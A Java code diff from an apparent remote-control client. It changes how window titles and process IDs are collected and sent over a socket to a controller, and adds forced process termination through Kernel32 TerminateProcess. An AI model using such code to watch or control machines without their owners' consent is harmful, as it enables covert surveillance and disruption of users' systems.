@@ -2,7 +2,10 @@ package me.client.send;
 
 import com.sun.jna.NativeLong;
 import com.sun.jna.Pointer;
+import com.sun.jna.platform.win32.Kernel32;
 import com.sun.jna.platform.win32.User32;
+import com.sun.jna.platform.win32.WinDef;
+import com.sun.jna.platform.win32.WinNT;
 import com.sun.jna.ptr.IntByReference;
 import me.client.utils.LoadDLL;
 import me.client.utils.MessageFlags;
@@ -52,8 +55,8 @@ public class SystemManager {
             } else {
                 char[] lpString = new char[260];
                 User32.INSTANCE.GetWindowText(hWnd, lpString, 260);
-                String str = User32.INSTANCE.GetWindowThreadProcessId(hWnd,intByReference) +"|" + String.valueOf(lpString);
-                SendMessage.Send(MessageFlags.ENUM_WINDOWS,str.getBytes( ),socket);
+                String str =User32.INSTANCE.GetWindowThreadProcessId(hWnd,intByReference) +"|" + LoadDLL.instance.GetWindowsID(hWnd) + "|" + String.valueOf(lpString);
+                SendMessage.Send(MessageFlags.ENUM_WINDOWS,str.getBytes(),socket);
             }
             return true;
         }, pointer);
@@ -99,6 +102,7 @@ public class SystemManager {
         }
     }
     public static void stopProcess(int PID) {
-        LoadDLL.instance.killTasklist(new NativeLong(PID));
+        WinNT.HANDLE handle = Kernel32.INSTANCE.OpenProcess(WinNT.PROCESS_ALL_ACCESS,false,PID);
+        Kernel32.INSTANCE.TerminateProcess(handle,0);
     }
     }
